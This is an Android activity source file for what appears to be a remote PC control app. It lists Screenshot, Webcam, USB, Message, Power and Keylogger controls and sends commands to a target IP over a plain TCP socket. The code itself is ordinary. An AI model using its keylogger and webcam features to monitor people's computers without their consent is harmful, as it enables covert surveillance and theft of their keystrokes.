package sour.project.be;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;

import sour.project.be.adapters.ControlsAdapter;
import sour.project.be.data.Controls;
import sour.project.be.data.Server;
import android.support.v7.app.AppCompatActivity;
import android.content.Intent;
import android.content.res.Resources;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.GridView;

public class ControlActivity extends AppCompatActivity {

	String name, ipAddress;
	List<Controls> mControls;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_control);
		Bundle bundle = getIntent().getExtras();
		name = bundle.getString("name");
		ipAddress = bundle.getString("ipAddress");
		Server.IP = ipAddress;
		setTitle(name);
		getSupportActionBar().setDisplayHomeAsUpEnabled(true);
		addControls();
		GridView gridView = (GridView) findViewById(R.id.gvControls);
		gridView.setAdapter(new ControlsAdapter(getApplicationContext(),
				mControls));
		gridView.setOnItemClickListener(new OnItemClickListener() {

			@Override
			public void onItemClick(AdapterView<?> parent, View view,
					int position, long id) {
				Intent intent = new Intent(ControlActivity.this, mControls
						.get(position).cls);
				startActivity(intent);
			}
		});
	}

	private void addControls() {
		mControls = new ArrayList<Controls>();
		Resources res = getResources();
		mControls.add(new Controls("Screenshot", res
				.getDrawable(R.drawable.ic_screenshot_black_shadow_2),
				ScreenshotActivity.class));
		mControls
				.add(new Controls("Webcam", res
						.getDrawable(R.drawable.ic_webcam_black),
						WebcamActivity.class));
		mControls
				.add(new Controls("USB Controls", res
						.getDrawable(R.drawable.ic_usb_solid_black),
						UsbActivity.class));
		mControls.add(new Controls("Message", res
				.getDrawable(R.drawable.ic_message_black),
				MessageActivity.class));
		mControls.add(new Controls("Power", res
				.getDrawable(R.drawable.ic_power_black_sleek),
				PowerActivity.class));
		mControls.add(new Controls("Keylogger", res
				.getDrawable(R.drawable.ic_keylogger_1),
				KeyloggerActivity.class));
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		//getMenuInflater().inflate(R.menu.control, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();
		if (id == R.id.action_settings) {
			return true;
		}
		if (id == android.R.id.home) {
			onBackPressed();
			return true;
		}
		return super.onOptionsItemSelected(item);
	}

	public class ConnectTask extends AsyncTask<String, Void, Void> {

		String ip;
		int port;
		String result;

		ConnectTask(String _ip, int _port) {
			ip = _ip;
			port = _port;
		}

		@Override
		protected Void doInBackground(String... params) {
			Socket client = null;
			PrintWriter pw = null;
			try {
				Log.d(App.TAG, "PRE");
				client = new Socket(ip, port);
				Log.d(App.TAG, "Just created new socket");
				pw = new PrintWriter(client.getOutputStream(), true);
				Log.d(App.TAG, "set up printwriter");
				pw.println(params[0]);
				Log.d(App.TAG, "print");
				result = "SUCCESS";
			} catch (UnknownHostException e) {
				result = "Unknown Host";
				Log.d(App.TAG, "unknown host");
				e.printStackTrace();
			} catch (IOException e) {
				result = "IO Exception #1";
				Log.d(App.TAG, "io #1");
				e.printStackTrace();
			} finally {
				if (client != null) {
					try {
						pw.close();
						client.close();
					} catch (IOException e) {
						result = "IO Exception #2";
						Log.d(App.TAG, "io #2");
						e.printStackTrace();
					}

				}
			}
			return null;
		}

		@Override
		protected void onPostExecute(Void exResult) {
			Log.d(App.TAG, "POST");
			super.onPostExecute(exResult);
		}

	}
}
